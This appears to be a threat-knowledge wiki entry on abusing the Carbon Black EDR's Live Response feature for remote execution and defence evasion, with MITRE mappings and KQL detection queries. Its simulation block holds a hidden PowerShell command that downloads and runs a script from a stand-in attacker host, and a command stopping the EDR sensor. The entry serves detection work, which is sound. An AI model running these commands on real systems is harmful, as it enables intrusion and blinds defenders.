---
title: Carbon Black (EDR / Defense)
tags:
  - Defense Evasion
  - Execution
  - Credential Access
references:
  - https://www.vmware.com/content/dam/digitalmarketing/vmware/en/pdf/docs/vmware-carbon-black-edr-ultimate-guide.pdf
files: []
---

Carbon Black is an enterprise EDR platform used for process monitoring, threat detection, and incident response. When attackers obtain access to the Carbon Black console or API keys, they can abuse these capabilities for remote code execution and defense evasion.

# Abusing Live Response a

## Description
Threat actors can use Carbon Black Live Response sessions to execute commands and scripts on endpoints, deploy additional tooling, or collect data. They may also issue commands to stop or uninstall the sensor on targeted hosts, reducing visibility.
The capability turns Carbonblack into a full blown C2

## Simulation
```text
# Example pseudo Live Response usage (API / CLI)
cblr.exe -i <session_id> exec "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')"

# Stopping sensor service
sc stop carbonblack
```

## MITRE ATT&CK
T1059 – Command and Scripting Interpreter  
T1562.001 – Impair Defenses: Disable or Modify Tools  
T1078 – Valid Accounts

## Detections
```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cblr.exe","cb.exe","cbcli.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
```

```kql
DeviceProcessEvents
| where FileName =~ "sc.exe"
| where ProcessCommandLine has_any ("carbonblack","cbdefense","cbservice")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
```
